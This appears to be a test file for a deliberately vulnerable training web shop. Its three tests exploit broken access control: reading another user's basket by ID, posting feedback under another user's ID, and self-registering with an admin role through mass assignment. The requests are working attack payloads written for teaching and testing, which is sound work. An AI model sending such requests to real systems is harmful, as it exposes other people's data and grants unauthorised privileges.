"""A01:2021 Broken Access Control: other people's data, and acting as them."""


def test_read_another_users_basket(shop, solves):
    # The basket id in the URL is trusted; nothing checks it's yours (IDOR).
    # An ordinary new customer reads basket 1, which belongs to the admin.
    token = shop.new_user_token("eve@example.test")
    with solves("View Basket"):
        response = shop.get("/rest/basket/1", headers={"Authorization": f"Bearer {token}"})
    assert response.status_code == 200
    assert response.json()["data"]["id"] == 1


def test_post_feedback_as_someone_else(shop, solves):
    # The server takes the author from the request body instead of the session.
    captcha = shop.captcha()
    with solves("Forged Feedback"):
        response = shop.post("/api/Feedbacks/", json={
            "UserId": 2, "comment": "Posted in someone else's name", "rating": 3,
            "captchaId": captcha["captchaId"], "captcha": captcha["answer"],
        })
    assert response.status_code == 201
    assert response.json()["data"]["UserId"] == 2


def test_register_as_an_admin(shop, solves):
    # Mass assignment: the server copies "role" from the body onto the user.
    with solves("Admin Registration"):
        response = shop.post("/api/Users/", json={
            "email": "mallory@example.test", "password": "hunter22", "passwordRepeat": "hunter22", "role": "admin",
        })
    assert response.status_code == 201
    assert response.json()["data"]["role"] == "admin"
